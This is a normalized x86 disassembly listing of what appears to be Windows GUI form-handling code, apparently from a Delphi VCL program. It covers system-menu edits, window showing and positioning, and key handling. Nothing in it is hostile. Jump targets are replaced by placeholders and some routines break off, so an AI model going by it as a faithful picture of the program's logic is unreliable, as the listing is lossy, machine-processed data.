mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4693ac
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_452270
pop edi
pop esi
retn
sub_4693f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4694f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_467f1c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4693f8
pop ecx
sub_469528
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ed04
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_453e1c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44dcdc
pop esi
pop ebx
retn
sub_4695b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_453070
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_460fb4
sub_469618
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_45210c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_4609c8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_469664
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_461228
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46969c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_469737
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46973e
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_460928
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46e458
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_44a798
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46e458
jmp r-xdata
sub_469764
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403370
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4697a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cb3c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4697d0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_468f90
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_44a570
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_469828
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_452f54
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ce0c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403370
sub_4698b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_453e1c
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46994c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_453e1c
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_468f2c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403370
sub_4699a4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_454350
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4699d0
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_468f90
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4699ec
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_460958
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_460958
sub_469a2c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_469a64
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f40
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_469a98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_469be9
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469bf0
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4699ec
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_44a514
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416c28
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44d14c
lea eax [ ebp - 0x1c ]
call sub_406ab0
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4699ec
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_469a2c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46e0fc
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46e164
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46e164
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_469a64
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416c28
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44d14c
lea eax [ ebp - 0x1c ]
call sub_406ab0
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46e094
test [ esi + 0x228 ] 0x8
je r-xdata
sub_469bf8
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_469c6c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_469c98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4523b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467ca8
lea edx [ ebp - 0x14 ]
call sub_46b470
push ebp
mov eax [ ebp - 0x4 ]
call sub_467ca8
lea edx [ ebp - 0x24 ]
call sub_46b470
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_469c6c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_467ca8
lea edx [ ebp - 0x24 ]
call sub_46b470
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_469c6c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_469c6c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_469c6c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_469d50
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403370
pop esi
pop ebx
retn
sub_469d74
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403370
pop esi
pop ebx
retn
sub_469d98
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_453298
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_454350
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_454350
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_469e34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a39e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46e548
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_46a381
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a388
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
push ebp
push j_sub_40363c#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_40363c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468fe0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451374
jmp r-xdata
mov eax [ rw-data ]
call sub_46b6cc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_453e1c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_46b6c0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d07c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
call sub_464b10
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46b6fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46b6cc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44d894
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46b6f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d07c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46b6c0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_468290
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_468290
jmp r-xdata
sub_469ef1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46dc5c
call sub_4039a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_46b6cc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46b6c0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d07c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
